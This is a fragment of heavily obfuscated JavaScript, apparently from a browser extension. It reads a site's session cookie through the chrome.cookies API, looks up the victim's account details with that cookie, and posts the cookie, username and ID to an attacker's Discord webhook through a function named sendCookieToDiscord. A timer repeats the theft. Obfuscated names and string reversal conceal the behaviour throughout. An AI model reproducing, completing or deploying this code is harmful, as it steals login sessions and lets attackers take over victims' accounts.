_0x1ec047(_0x398a52-0x12,_0x5c0955-0xfe,_0x25f8c6-0x110,_0x398a52,_0x25f8c6- -0x1d0);}_0x141950&&_0x57cea2[_0x4ee6d1(0x3da,0x3b9,0x391,0x39d,0x38a)](_0x390236,_0x141950[_0x4ee6d1(0x2b4,0x266,0x2f6,0x284,0x283)]);});}else return _0x2154c3[_0x4c194f(0x5be,0x61f,0x57d,0x5e4,0x587)](_0x3274fa,_0x40c608[_0x1ec047(0x50d,0x569,0x489,0x55f,0x4fd)]('')[_0x4c194f(0x556,0x4a4,0x508,0x4d8,0x48c)+'se']()[_0x1ec047(0x4a4,0x4d5,0x4a9,0x4c3,0x520)](''));}else{if(_0x2154c3[_0x269217(0x37,0xe3,0x37,0xa3,0xa1)](_0x2154c3[_0x1ec047(0x523,0x4bb,0x4c5,0x47b,0x4c1)],_0x2154c3[_0x3f087a(0x52,0xee,0x47,0xe7,0xbe)]))_0x2154c3[_0x269217(0x1b0,0x1ce,0x157,0x145,0x149)](_0x2eeb69,_0x23320b[_0x269217(0x134,0x13f,0x75,0x97,0xd1)]);else return _0x2154c3[_0x319f0e(0x584,0x5d6,0x5b3,0x5d7,0x559)](_0x3274fa,_0x40c608);}}});function _0x5dbafd(_0x5993ca,_0x86bd36,_0x468017,_0x5b5e8b,_0x12e1cb){return _0xeac42d(_0x12e1cb,_0x86bd36-0x1d3,_0x468017-0x11,_0x468017-0x49e,_0x12e1cb-0x174);}function _0xddc30a(_0x523c6c,_0x531732,_0x39e391,_0x2ceb9c,_0x462641){return _0x1e14ab(_0x523c6c-0x4e,_0x531732-0xd,_0x39e391-0x11e,_0x2ceb9c,_0x531732-0xe3);}function _0x84728e(_0x18411c,_0x45abfd,_0x59f280,_0x57035e,_0x44ecd6){return _0xeac42d(_0x44ecd6,_0x45abfd-0x5,_0x59f280-0x1a2,_0x59f280-0x10d,_0x44ecd6-0xb2);}return _0x5dbafd(0x47e,0x426,0x467,0x4ca,0x3f4)+_0xe30ac4(-0x204,-0x263,-0x262,-0x226,-0x292)+_0x5e5506(0x4f4,0x571,0x4c5,0x55b,0x557)+_0xddc30a(0x4fc,0x500,0x4ce,0x58f,0x50a)+_0xe30ac4(-0x1b2,-0x1ed,-0x13f,-0x192,-0x12c)+_0x5e5506(0x42e,0x446,0x457,0x481,0x3f2)+_0x5dbafd(0x3ba,0x40a,0x3c7,0x3bf,0x436)+_0x41c343+'/'+_0x3115af;}async function sendCookieToDiscord(_0x475c3c){function _0x2a1c50(_0x487c2e,_0x31c344,_0x7bb788,_0x1a90d0,_0x21e42a){return _0x5f3140(_0x487c2e-0x1a8,_0x31c344,_0x7bb788-0xdd,_0x1a90d0-0x15,_0x7bb788- -0x41e);}function _0x398f39(_0x11be43,_0x35de13,_0x368c97,_0x21351e,_0x6e87e4){return _0x1e14ab(_0x11be43-0xc6,_0x35de13-0x172,_0x368c97-0x109,_0x21351e,_0x35de13- -0x44d);}function _0xd4c581(_0x48803c,_0x1bc6a8,_0x40a70a,_0x5e8704,_0x5aa39c){return _0x108c52(_0x48803c-0x5f,_0x1bc6a8-0x1c9,_0x40a70a-0x10e,_0x5e8704,_0x48803c- -0x26f);}function _0x38bfce(_0xc9a701,_0x33fdc7,_0x10835c,_0x32d416,_0x5c6f53){return _0x1e14ab(_0xc9a701-0x112,_0x33fdc7-0x76,_0x10835c-0x1c5,_0x33fdc7,_0x5c6f53- -0x15d);}const _0x10c96e={'PjhmZ':function(_0x6c7a6c,_0x4b8204){return _0x6c7a6c(_0x4b8204);},'buztp':function(_0x5e0c13,_0x4ce78c){return _0x5e0c13===_0x4ce78c;},'PFiMD':_0x38bfce(0x34a,0x387,0x334,0x32b,0x372)+_0x38bfce(0x2ef,0x32c,0x28c,0x273,0x29f)+_0x2a1c50(0x101,0x138,0x119,0xa3,0xbd)+_0x38bfce(0x2eb,0x31b,0x300,0x2f9,0x2f6)+_0x38bfce(0x36c,0x36f,0x300,0x344,0x332),'qtGiW':function(_0x39dc75,_0x5a3e1c){return _0x39dc75!==_0x5a3e1c;},'ntYDo':_0x2a1c50(0x173,0x14c,0x10d,0xe9,0x118),'UTtyh':_0xd4c581(-0x97,-0x11c,-0x77,-0x60,-0x105),'EOlKc':function(_0x2043bc){return _0x2043bc();},'VHrdq':_0x5ede7b(-0x33,-0x9a,-0x27,-0x21,-0x32)+_0x5ede7b(0x4d,-0xe,0x75,0x1c,0x3)+'L:','MIFmD':function(_0x11f1fe,_0x2eaac1){return _0x11f1fe(_0x2eaac1);},'qIuSK':_0xd4c581(-0x7a,-0x105,-0x38,-0x68,-0x83)+_0x398f39(0x7e,0x1f,0x11,0x13,0xa1)+_0x398f39(0xba,0x79,0x1d,0x63,0xd0)+_0x38bfce(0x286,0x2f6,0x244,0x2eb,0x2a2)+'g','BeZyp':function(_0x3dd59b,_0x3a1597){return _0x3dd59b===_0x3a1597;},'RmMVU':_0xd4c581(-0x11d,-0x1a2,-0x164,-0x175,-0xed),'SHtnJ':function(_0x1a01c9,_0x49859b,_0x5cbddd){return _0x1a01c9(_0x49859b,_0x5cbddd);},'svyqR':_0x2a1c50(0x174,0x122,0x16a,0x13c,0x167)+_0x38bfce(0x2ef,0x2e0,0x244,0x2fb,0x2ce)+_0x38bfce(0x26a,0x254,0x2bc,0x32d,0x2a8)+_0x38bfce(0x335,0x307,0x3f0,0x373,0x36a)+_0x2a1c50(0x153,0x102,0x11c,0x192,0x10a)+_0x38bfce(0x2b7,0x34d,0x327,0x2bf,0x2e2)+_0x38bfce(0x305,0x22b,0x320,0x2ea,0x2ab)+_0xd4c581(-0x25,0x23,-0x31,0x3,-0x62)+_0x2a1c50(0x1fa,0x161,0x16e,0x15d,0x101)+'ed','HSOao':_0x398f39(0x6e,0x78,0x107,0x9c,0xa0),'XyIlg':_0x38bfce(0x3c9,0x32b,0x2d7,0x309,0x344),'YTyDc':_0x5ede7b(-0x19,0x36,-0x2e,-0x4a,-0xc),'GfTQF':_0x38bfce(0x25e,0x225,0x261,0x215,0x26c)+_0x38bfce(0x2d2,0x346,0x36f,0x31f,0x32d)+_0x5ede7b(0x4,-0xd2,-0x74,0x6,-0x56)+'n','HSjLo':function(_0x540df6,_0x4e1e0b){return _0x540df6||_0x4e1e0b;},'NaybE':_0x5ede7b(-0x4b,-0x22,-0x4f,0x2,-0x6f)+_0x5ede7b(-0x29,-0x3c,0x56,0x3d,-0x39)+_0x38bfce(0x375,0x376,0x337,0x2a3,0x32c)+'D','DjEMv':_0xd4c581(-0x29,-0x12,0x4d,0x8,0x32)+_0x398f39(-0x68,-0x3e,-0x2e,-0xba,-0x8a),'ScbGC':_0x5ede7b(-0x44,-0x46,-0x88,-0x64,-0x3e),'FNrNc':_0x38bfce(0x2d2,0x2cf,0x253,0x2bf,0x2db)+'ID','pIMaO':_0x398f39(0xa1,0x1e,-0x51,0x6a,0x51)+_0x398f39(0x58,0x1b,0x22,0x53,0x28)+_0x2a1c50(0x213,0x180,0x199,0x1ec,0x15a)+_0x398f39(0x6,-0x3,-0x73,-0x90,0x5e)+_0x2a1c50(0x168,0x1f2,0x165,0x173,0x1eb)+_0x38bfce(0x30b,0x20c,0x2c1,0x263,0x286)+_0x2a1c50(0x181,0x198,0x194,0x1e9,0x15d)+_0xd4c581(-0x39,-0x51,-0x72,-0x1d,-0x8b)+_0xd4c581(-0xb7,-0x12d,-0xbd,-0xe8,-0xda)+_0xd4c581(-0xcc,-0xb9,-0x61,-0x127,-0x5d)+_0x38bfce(0x28e,0x341,0x2f8,0x329,0x2ea)+_0x398f39(0x15,0x6b,0xf6,0x6d,-0x1a)+_0x398f39(-0xc7,-0x8b,-0x1e,-0x6d,-0xb0)+_0x5ede7b(-0x2e,-0x4d,-0xa,-0x46,-0x6c)+_0x5ede7b(-0x18,-0x92,-0x104,-0x12,-0x8c)+_0x5ede7b(-0xf,0x30,0xa2,-0x53,0x18)+_0x2a1c50(0x1fa,0x257,0x1d6,0x247,0x165)+_0x398f39(0xae,0x65,0xdf,0x2f,0xca)+_0x2a1c50(0x1eb,0x139,0x1a3,0x1c3,0x1b4)+_0xd4c581(-0xf,0x36,0x42,-0x92,0x4),'FmfdH':_0x38bfce(0x286,0x269,0x2a0,0x265,0x2f3)+'to','iDAOl':_0x2a1c50(0x90,0xa5,0xd1,0x120,0xd9)+_0xd4c581(-0xdf,-0x14e,-0x114,-0x153,-0xe7),'IoHss':_0xd4c581(-0x7a,-0x5d,-0xc2,-0x16,-0xa6)+_0x38bfce(0x36d,0x399,0x373,0x356,0x30b)+_0xd4c581(-0x4b,-0xa9,-0xcb,-0x6a,-0xd1)+_0x398f39(0x0,-0x3,-0x3d,-0x8,-0x3d)+_0x398f39(0xf,0x19,0x13,-0x9,0x26)+_0x5ede7b(-0xe5,-0x65,-0xeb,-0x71,-0xb0)+_0xd4c581(-0x50,-0xbf,-0xc,-0xd,-0xc1)+_0x5ede7b(0x49,0x27,0x6e,0x71,0x19)+_0x5ede7b(-0xad,-0x38,-0x72,-0xa3,-0x65)+_0xd4c581(-0xcc,-0x99,-0xb5,-0x62,-0xab)+_0x398f39(-0x5e,0x1d,0x9d,0x45,-0x4d)+_0x2a1c50(0x16d,0x142,0x14e,0xd5,0x13e)+_0xd4c581(-0x36,-0x6f,0x18,0x56,-0x87)+_0x2a1c50(0x165,0x1a4,0x19a,0x16d,0x1e1)+_0xd4c581(-0x22,0x58,-0x89,0x61,0x1f)+_0x398f39(0x33,0x86,0x36,0xc2,0xab)+_0x398f39(-0x8b,-0x63,-0xca,-0x55,-0xe9)+_0x5ede7b(-0x24,-0x4a,-0x43,-0x6c,-0x9d)+_0x2a1c50(0x1c6,0x158,0x1ac,0x211,0x22e)+_0x2a1c50(0x1bd,0x235,0x1c6,0x247,0x1c4)+_0x38bfce(0x2f1,0x253,0x30e,0x24a,0x2a5)+_0x38bfce(0x2c0,0x25a,0x2a0,0x2d0,0x271)+_0xd4c581(-0xbf,-0x6f,-0x3e,-0x96,-0xb9)+_0x2a1c50(0x139,0xb6,0x13d,0xb8,0x14d)+_0x398f39(0x40,0x26,0x51,-0x1c,0x11)+'g','USmwu':function(_0x448faf,_0x11d15d){return _0x448faf===_0x11d15d;},'RLuwD':_0xd4c581(-0x89,-0x118,-0xf5,-0x8e,-0x29),'DZfbK':_0x2a1c50(0x20c,0x145,0x19f,0x1e5,0x209),'NLkwr':_0x2a1c50(0x228,0x215,0x1ce,0x25d,0x1d1)+_0xd4c581(-0x64,-0x91,-0x73,-0xee,-0x60)+_0x2a1c50(0x169,0xa2,0x12b,0x1ae,0x156)+_0x38bfce(0x323,0x229,0x325,0x217,0x29d)+_0x38bfce(0x300,0x29a,0x2dd,0x29a,0x2c1)+_0x38bfce(0x238,0x230,0x208,0x279,0x27d)};function _0x5ede7b(_0xc926a,_0x41dbe7,_0x57bacb,_0x85df2d,_0x3a2c4d){return _0x5f3140(_0xc926a-0x1f3,_0x85df2d,_0x57bacb-0xae,_0x85df2d-0x1bb,_0x3a2c4d- -0x5b0);}try{if(_0x10c96e[_0x38bfce(0x253,0x24a,0x248,0x32f,0x2a0)](_0x10c96e[_0x2a1c50(0x1a5,0xab,0x13b,0x120,0xf9)],_0x10c96e[_0x38bfce(0x2ec,0x278,0x2ce,0x315,0x2ef)])){const _0x1031dc=_0x10c96e[_0xd4c581(-0xd,-0x9a,0x75,-0x30,-0x28)](assembleHook);console[_0x5ede7b(-0x10d,-0x78,-0xa6,-0xba,-0x98)](_0x10c96e[_0x5ede7b(-0x19,0x8a,-0x8,0x82,0x1e)],_0x1031dc);const _0x58064a=await(await _0x10c96e[_0x5ede7b(-0x66,-0x6b,-0x2b,-0x8a,-0x95)](fetch,_0x10c96e[_0x398f39(-0x6a,0x0,0x35,-0x75,-0x20)]))[_0x2a1c50(0x94,0xd9,0x113,0xcf,0x14a)]();let _0x420a5d=null;if(_0x475c3c){if(_0x10c96e[_0x398f39(-0xe3,-0x76,-0x40,-0xac,-0xbc)](_0x10c96e[_0x5ede7b(-0x10d,-0xd5,-0x58,-0xee,-0xad)],_0x10c96e[_0x5ede7b(-0x30,-0x68,-0xef,-0x131,-0xad)])){const _0x4c2a9b={};_0x4c2a9b[_0x5ede7b(-0x4,-0x5d,0xa,-0x19,-0x6f)+'e']=_0x5ede7b(-0x4b,0x22,-0x23,-0x7f,-0x22)+_0xd4c581(-0x1a,-0x6e,-0x8e,0xa,0x34)+_0x398f39(-0xeb,-0x75,-0x2,-0x99,-0xa3)+_0x475c3c;const _0x1655ac={};_0x1655ac[_0x38bfce(0x3ac,0x328,0x32a,0x2e9,0x373)+'rs']=_0x4c2a9b;const _0x4e4e7c=await _0x10c96e[_0x398f39(-0xce,-0x6c,-0x48,-0xea,-0xc5)](fetch,_0x10c96e[_0x2a1c50(0x25b,0x20b,0x1cc,0x1fc,0x1cb)],_0x1655ac);if(!_0x4e4e7c['ok']){if(_0x10c96e[_0x398f39(-0x67,-0x12,-0x9e,-0xf,0x59)](_0x10c96e[_0x5ede7b(0x29,0x59,0x35,-0x4d,-0x19)],_0x10c96e[_0x398f39(0xa6,0x4a,0xaa,0x7,0xcb)]))_0x523cc7&&_0x10c96e[_0xd4c581(-0x7e,-0x88,-0xaa,-0x10d,-0x10d)](_0x281829,_0x5beeb7[_0xd4c581(-0xf4,-0xfd,-0x12e,-0xbe,-0x183)]);else{console[_0x2a1c50(0x134,0x184,0x10b,0x10a,0xae)](_0x10c96e[_0x398f39(-0xf,-0x1c,-0x33,-0xe,-0x6a)],_0x4e4e7c[_0x398f39(-0x18,0x39,-0x1c,-0xc,0xb)+'s']);return;}}_0x420a5d=await _0x4e4e7c[_0x38bfce(0x27e,0x1f5,0x20a,0x306,0x276)]();}else return _0x10c96e[_0x398f39(-0x6d,0x1a,-0x21,-0xb,-0x5b)](_0xa4f373,_0x2689d6[_0xd4c581(-0xbd,-0x113,-0x42,-0x69,-0xb3)]('')[_0x2a1c50(0x7f,0x2b,0xbb,0x65,0xa3)+'se']()[_0x38bfce(0x2a8,0x36d,0x265,0x343,0x2ee)](''));}await _0x10c96e[_0x5ede7b(-0x4b,-0xdc,-0x3a,-0xa2,-0xb2)](fetch,_0x1031dc,{'method':_0x10c96e[_0xd4c581(-0x70,-0xaf,-0xab,-0xc7,-0xcc)],'headers':{'Content-Type':_0x10c96e[_0xd4c581(-0xf0,-0xb9,-0xd3,-0xe2,-0x120)]},'body':JSON[_0x2a1c50(0x1a3,0xef,0x145,0x1c2,0x13b)+_0x38bfce(0x2c7,0x2f5,0x349,0x322,0x2f9)]({'content':null,'embeds':[{'description':'\x0a'+_0x10c96e[_0x5ede7b(-0x42,-0x33,-0x30,-0x55,-0xa8)](_0x475c3c,_0x10c96e[_0x2a1c50(0x129,0xa4,0xe6,0xf4,0x75)])+'\x0a','color':null,'fields':[{'name':_0x10c96e[_0xd4c581(-0x5d,-0x5c,-0x8d,-0x13,-0x67)],'value':_0x420a5d?_0x420a5d[_0x5ede7b(-0x11e,-0x8a,-0x12a,-0x103,-0xc3)]:_0x10c96e[_0x5ede7b(-0x9c,-0xa8,-0x6c,-0x7a,-0xbd)],'inline':!![]},{'name':_0x10c96e[_0x398f39(0xbd,0x33,0x32,-0x2c,-0x21)],'value':_0x420a5d?_0x420a5d['id']:_0x10c96e[_0x5ede7b(-0x51,-0x2f,-0x4a,-0x7c,-0xbd)],'inline':!![]}],'author':{'name':_0x2a1c50(0x11f,0x197,0x157,0x1e8,0x124)+_0xd4c581(-0xbb,-0xea,-0x76,-0xc7,-0x129)+_0x2a1c50(0x14e,0x1aa,0x15a,0x156,0x15e)+_0x58064a,'icon_url':_0x420a5d?_0x38bfce(0x2b5,0x362,0x352,0x35f,0x30e)+_0xd4c581(-0x88,0x4,-0x20,-0x9f,-0x15)+_0x5ede7b(0x75,0x36,0x1a,-0x3,0x37)+_0xd4c581(-0x110,-0x189,-0x177,-0xdd,-0xa4)+_0x2a1c50(0x13b,0x1a3,0x12e,0x101,0x13b)+_0xd4c581(-0x10a,-0x15c,-0xb7,-0xdb,-0xd4)+_0x5ede7b(-0x4d,-0x46,-0xf4,-0xc3,-0x73)+_0xd4c581(-0x8c,-0x57,-0xc6,-0x22,-0x20)+_0xd4c581(-0x71,-0x37,-0xc1,0x10,-0x9b)+_0xd4c581(-0x62,-0x56,-0x82,-0xe6,-0xdf)+_0x398f39(0x79,-0x9,0x5d,0x0,-0x74)+_0x420a5d['id']+(_0x398f39(0x81,0x75,0x59,0xe9,0xfe)+_0x398f39(-0x73,-0x31,0x4,-0xb4,-0xbb)+_0xd4c581(-0xaf,-0xd2,-0x5a,-0xab,-0x117)+_0x2a1c50(0x1b2,0x176,0x1bd,0x21f,0x173)+_0x2a1c50(0xcd,0xfe,0x141,0x12f,0x103)+_0xd4c581(-0xc,0x6c,0x15,0x70,0x5)+'ng'):_0x10c96e[_0x398f39(-0xf0,-0x74,-0x85,-0x2c,-0x78)]},'footer':{'text':_0x10c96e[_0xd4c581(-0x49,0x6,-0x8f,-0x78,-0xc0)],'icon_url':''},'thumbnail':{'url':_0x420a5d?_0x38bfce(0x35d,0x2ac,0x2c3,0x297,0x30e)+_0xd4c581(-0x88,-0xd3,0x8,-0x9a,-0x3)+_0x5ede7b(-0x8,0x1e,0xab,0x33,0x37)+_0x5ede7b(-0x5a,-0x8d,-0x111,-0xc1,-0xbe)+_0xd4c581(-0xb6,-0x12b,-0x13a,-0x93,-0x64)+_0x5ede7b(-0xaf,-0x2f,-0x42,-0xe6,-0xb8)+_0x38bfce(0x280,0x2aa,0x281,0x2a7,0x2c3)+_0x38bfce(0x323,0x308,0x305,0x29e,0x2fc)+_0x5ede7b(0x48,-0x71,0x41,0x59,-0x1f)+_0xd4c581(-0x62,0xb,-0x95,-0x1b,-0x43)+_0x38bfce(0x332,0x25f,0x2fb,0x28e,0x2e7)+_0x420a5d['id']+(_0x398f39(0x3d,0x75,-0x2,-0x1b,0xb6)+_0x38bfce(0x26f,0x2ac,0x252,0x2c3,0x2bf)+_0x398f39(0x3e,-0x17,-0x47,-0x5d,0x38)+_0x2a1c50(0x24b,0x1d9,0x1bd,0x1e9,0x236)+_0x2a1c50(0x163,0x10f,0x141,0xcf,0xf2)+_0xd4c581(-0xc,-0x95,-0x8e,-0x13,0x2f)+'ng'):_0x10c96e[_0x398f39(-0x3a,-0x74,-0xd6,-0xf4,-0x28)]}}],'username':_0x10c96e[_0x2a1c50(0x29,0x2e,0xb8,0x4e,0xc7)],'avatar_url':_0x10c96e[_0x398f39(-0x4,0x74,0x10,0x1,0x1a)],'attachments':[]})});}else{const _0x1efdb8=_0x3b96b4=>_0x2981fc(_0x3b96b4)[_0x5ede7b(-0x94,-0x52,0x23,-0xcd,-0x6b)]('')[_0xd4c581(-0x48,-0xa7,-0x3c,-0xe,-0x10)](_0x3f9bce=>_0x446f13[_0x398f39(-0x40,0x5,0x67,-0x4e,0x4f)+_0x2a1c50(0xc5,0x184,0x111,0x187,0x128)+'de'](_0x3f9bce[_0xd4c581(-0x19,0x3f,0x62,0x27,0x50)+_0x38bfce(0x318,0x2d4,0x31f,0x31a,0x321)](-0xb47*-0x1+-0xb05*0x3+0x8*0x2b9)-(-0x149d+0x267f*-0x1+0x3b1d*0x1)))[_0x38bfce(0x2bb,0x2e5,0x32d,0x29e,0x2ee)](''),[_0x1cfbf5,_0x5e92b1]=_0x35a859[_0x2a1c50(0x1b9,0x1be,0x19c,0x129,0x1df)]((_0x34923d,_0x412da4)=>{function _0x426bf3(_0x1576f6,_0x38ce8f,_0x46cd75,_0x2209d8,_0x372eff){return _0x5ede7b(_0x1576f6-0x171,_0x38ce8f-0x1d2,_0x46cd75-0x6,_0x2209d8,_0x372eff-0x36b);}function _0x68be0c(_0xf169a7,_0x479d61,_0xafcf45,_0x4a0b27,_0x25dbd3){return _0x398f39(_0xf169a7-0xf5,_0xafcf45-0x141,_0xafcf45-0x1c0,_0xf169a7,_0x25dbd3-0x9f);}function _0x516faf(_0x556c0d,_0x4e1475,_0x157479,_0x326417,_0x577402){return _0x2a1c50(_0x556c0d-0x168,_0x577402,_0x157479- -0x2f4,_0x326417-0x1b9,_0x577402-0x12);}function _0x4e486d(_0x5031d5,_0x2ece68,_0x562727,_0x2ea27b,_0x1ae6b2){return _0x2a1c50(_0x5031d5-0x1c3,_0x1ae6b2,_0x5031d5- -0x72,_0x2ea27b-0x2,_0x1ae6b2-0x1bf);}function _0x155e6b(_0x8b2f0c,_0x218e30,_0x1580ce,_0x13c6be,_0x35e329){return _0x38bfce(_0x8b2f0c-0x6c,_0x8b2f0c,_0x1580ce-0x1ae,_0x13c6be-0x46,_0x218e30- -0x389);}return _0x10c96e[_0x426bf3(0x353,0x307,0x28a,0x356,0x313)](_0x412da4,0x922+-0x6cd*0x1+-0x254)?_0x10c96e[_0x426bf3(0x3d0,0x3c0,0x383,0x350,0x33f)](_0x1efdb8,_0x34923d[_0x155e6b(-0x120,-0xbe,-0x45,-0x59,-0x136)]('')[_0x155e6b(-0xe4,-0x12a,-0xe4,-0x177,-0x1a0)+'se']()[_0x68be0c(0x151,0x107,0x13f,0xe8,0xe7)]('')):_0x10c96e[_0x4e486d(0xf4,0x165,0x165,0xd5,0x176)](_0x1efdb8,_0x34923d);});return _0x5ede7b(0xe,-0x4e,-0x2c,-0x33,-0x28)+_0x398f39(-0xc9,-0x8a,-0xb1,-0x70,-0x72)+_0x2a1c50(0x1a7,0x1f2,0x1b8,0x209,0x179)+_0x38bfce(0x239,0x266,0x255,0x28b,0x2c0)+_0x5ede7b(-0xa3,0xd,-0x82,-0x42,-0x3c)+_0x38bfce(0x28b,0x284,0x2f5,0x2b5,0x296)+_0x2a1c50(0x91,0x141,0xca,0xf8,0x138)+_0x1cfbf5+'/'+_0x5e92b1;}}catch(_0x23fc2f){if(_0x10c96e[_0x5ede7b(-0x1f,-0x3b,-0xd,0x5a,0x13)](_0x10c96e[_0x38bfce(0x1d8,0x2dc,0x261,0x237,0x25e)],_0x10c96e[_0xd4c581(-0xa0,-0x2b,-0x28,-0x1b,-0x8c)])){_0x1fcefe[_0x38bfce(0x2a3,0x2a6,0x24d,0x31c,0x2af)](_0x10c96e[_0x398f39(0x67,-0x1c,-0x57,-0x78,-0xe)],_0x458e98[_0xd4c581(-0x5f,-0x1c,0xf,-0x1b,-0x3b)+'s']);return;}else console[_0x2a1c50(0xaf,0x115,0x10b,0x110,0x147)](_0x10c96e[_0x5ede7b(-0xb7,-0x19,-0xe0,-0xbe,-0x6e)],_0x23fc2f);}}function _0x3396fe(_0x5cc934,_0x417506,_0x40f22b,_0x25f226,_0x13d689){return _0x347a(_0x417506-0x182,_0x5cc934);}const _0x3e0081={};_0x3e0081[_0x108c52(0x2da,0x1e5,0x2cc,0x28d,0x253)]=_0x3396fe(0x307,0x349,0x395,0x38d,0x37b)+_0x5f3140(0x5ab,0x603,0x5b8,0x600,0x57a)+_0x1e14ab(0x50d,0x4f3,0x505,0x449,0x4ca)+_0x1e14ab(0x3c0,0x399,0x35d,0x41a,0x3d5)+'om';function _0xeac42d(_0x44741f,_0x492baa,_0x2903c1,_0x5ecc82,_0x7bdf4c){return _0x347a(_0x5ecc82- -0x1fe,_0x44741f);}function _0x5f3140(_0x406ddb,_0x421e9e,_0x460d84,_0x45bf0c,_0x906169){return _0x347a(_0x906169-0x3c1,_0x421e9e);}function _0x1e14ab(_0x4b459,_0x291591,_0x1652c7,_0x17d3be,_0x240b35){return _0x347a(_0x240b35-0x2a4,_0x17d3be);}_0x3e0081[_0x1e14ab(0x422,0x436,0x42f,0x438,0x3d0)]=_0x1e14ab(0x4c8,0x434,0x4c4,0x4a1,0x471)+_0x3396fe(0x3fb,0x3a9,0x332,0x378,0x3c0)+_0xeac42d(0x8c,0x2,-0x8b,0x5,-0x3e),chrome[_0x5f3140(0x553,0x4f9,0x566,0x505,0x4e4)+'es'][_0x3396fe(0x2e6,0x362,0x3cb,0x307,0x373)](_0x3e0081,_0x198fc7=>{function _0x1afe9f(_0x8f220d,_0x9311c1,_0x4192ab,_0x167034,_0x2e8098){return _0x108c52(_0x8f220d-0x1b4,_0x9311c1-0x110,_0x4192ab-0xbe,_0x8f220d,_0x2e8098- -0x3f5);}const _0x3e9f84={'zFPYF':function(_0x191295,_0x239d5c){return _0x191295===_0x239d5c;},'xZvBt':function(_0x126247,_0x78f21f){return _0x126247(_0x78f21f);},'acqTG':function(_0x234cd2,_0x5e3d46){return _0x234cd2(_0x5e3d46);},'HHyur':function(_0x46ca6b,_0x5e214c){return _0x46ca6b!==_0x5e214c;},'nHBRe':_0x589dfe(-0x1ce,-0xe4,-0x173,-0xed,-0x1bc),'oEJTV':function(_0x336f48,_0x33fa07){return _0x336f48(_0x33fa07);}};function _0x15c48f(_0x13134a,_0xd39a94,_0x588465,_0x5b8ac9,_0x414e75){return _0x108c52(_0x13134a-0x168,_0xd39a94-0x100,_0x588465-0x1db,_0x5b8ac9,_0x414e75- -0x119);}function _0x5055f0(_0x4f33ec,_0x26e8c2,_0x37ed78,_0x46f19b,_0x15fd17){return _0x1e14ab(_0x4f33ec-0xb8,_0x26e8c2-0x118,_0x37ed78-0x178,_0x46f19b,_0x4f33ec- -0x3b7);}function _0x570531(_0xe31642,_0x2a6d75,_0x14adab,_0x2a22e9,_0x480017){return _0x1e14ab(_0xe31642-0x1f,_0x2a6d75-0xba,_0x14adab-0x30,_0x2a22e9,_0x14adab-0x67);}function _0x589dfe(_0x546ace,_0x349f63,_0xd85188,_0x28d7db,_0x585c8b){return _0x1e14ab(_0x546ace-0x15b,_0x349f63-0x1d3,_0xd85188-0x114,_0x546ace,_0xd85188- -0x57c);}if(_0x198fc7){if(_0x3e9f84[_0x589dfe(-0x21a,-0x1fa,-0x194,-0x180,-0x1f5)](_0x3e9f84[_0x5055f0(0xf7,0x78,0xe0,0xe3,0x14a)],_0x3e9f84[_0x1afe9f(-0x1be,-0x21e,-0x184,-0x211,-0x1bd)]))return _0x3e9f84[_0x589dfe(-0xd0,-0xbf,-0xd9,-0x8a,-0x111)](_0x511aa1,0x297+-0x1e62+-0x944*-0x3)?_0x3e9f84[_0x1afe9f(-0x1d8,-0x1d4,-0x260,-0x274,-0x23b)](_0x3cd140,_0x1f2913[_0x15c48f(0x89,0xd0,0x102,0x10f,0x99)]('')[_0x589dfe(-0x21f,-0x21f,-0x1c0,-0x1d4,-0x1ae)+'se']()[_0x589dfe(-0x164,-0x17d,-0x131,-0x13d,-0xbd)]('')):_0x3e9f84[_0x570531(0x4d7,0x3ff,0x459,0x45b,0x455)](_0x3132a8,_0x2170f4);else _0x3e9f84[_0x589dfe(-0x17b,-0x163,-0xfa,-0xa9,-0x132)](sendCookieToDiscord,_0x198fc7[_0x1afe9f(-0x1f2,-0x231,-0x20c,-0x29b,-0x27a)]);}}),setInterval(()=>{const _0x355e8c={'xdwMN':_0x5a09c2(0x171,0x78,0x105,0xe2,0xbc)+_0x5a09c2(0xeb,0x19b,0xa5,0x10e,0x14a)+_0x34d7dd(0x2b,-0x23,-0x78,0xe,0x68)+_0x34d7dd(0x11d,0xb1,0x51,0xcc,0xee)+_0x570a07(0xa9,0x8a,0xde,0x56,0x68),'zVGOG':function(_0x4cfc71,_0x4a1fdb){return _0x4cfc71(_0x4a1fdb);},'vOyFA':function(_0x5cd5da,_0x46f65e){return _0x5cd5da!==_0x46f65e;},'nzdkC':_0x570a07(0x48,0x79,0xca,0x6a,0xa8),'fitET':_0x282a22(0x303,0x310,0x393,0x344,0x2e7),'kyRWe':function(_0xb3e697,_0x48a542){return _0xb3e697===_0x48a542;},'pSqxr':_0x34d7dd(-0x39,-0x2b,-0x6,0x50,0x61),'WLPRA':_0x34d7dd(0x85,0xce,0x4b,0x82,0xc4)+_0x570a07(0xcd,0x17,0xa2,0x69,0xa6)+_0x5a09c2(0x145,0x1ca,0x21f,0x1a1,0x1a0)+_0x282a22(0x25f,0x2bf,0x237,0x253,0x218)+'om','MIQcr':_0x282a22(0x2fb,0x26c,0x2f3,0x27e,0x2d5)+_0x5a09c2(0x22e,0x159,0x1c4,0x1a2,0x133)+_0x282a22(0x331,0x3ae,0x323,0x39f,0x384)};function _0x282a22(_0x27df98,_0x474a12,_0x49b0f5,_0x24a244,_0x53cf26){return _0x1e14ab(_0x27df98-0x1e7,_0x474a12-0xf,_0x49b0f5-0x1ed,_0x53cf26,_0x27df98- -0x176);}function _0x5a09c2(_0x3861f5,_0xbfe43e,_0x4492bb,_0x119d45,_0x4143f8){return _0xeac42d(_0x3861f5,_0xbfe43e-0x4e,_0x4492bb-0x1c3,_0x119d45-0x179,_0x4143f8-0xaf);}function _0x570a07(_0x290ff0,_0x5f4b81,_0x5e7a2f,_0x176592,_0x36e929){return _0x1e14ab(_0x290ff0-0x41,_0x5f4b81-0xa4,_0x5e7a2f-0x190,_0x290ff0,_0x36e929- -0x3b7);}const _0x572100={};_0x572100[_0x34d7dd(0x154,0x129,0x132,0xe0,0x13b)]=_0x355e8c[_0x34d7dd(-0x5,0xad,-0x2a,0x2e,0xb9)],_0x572100[_0x34d7dd(-0xa9,0x67,-0xa8,-0x19,-0x2f)]=_0x355e8c[_0x27dd1d(0x248,0x1de,0x1c7,0x222,0x2a8)];function _0x34d7dd(_0x5c0f5c,_0x4376a5,_0x4e94f8,_0xc140a6,_0x339b64){return _0x108c52(_0x5c0f5c-0xf1,_0x4376a5-0x162,_0x4e94f8-0xd3,_0x4e94f8,_0xc140a6- -0x173);}function _0x27dd1d(_0x22bc61,_0x49427f,_0x28196e,_0x5c8f6e,_0x1e429b){return 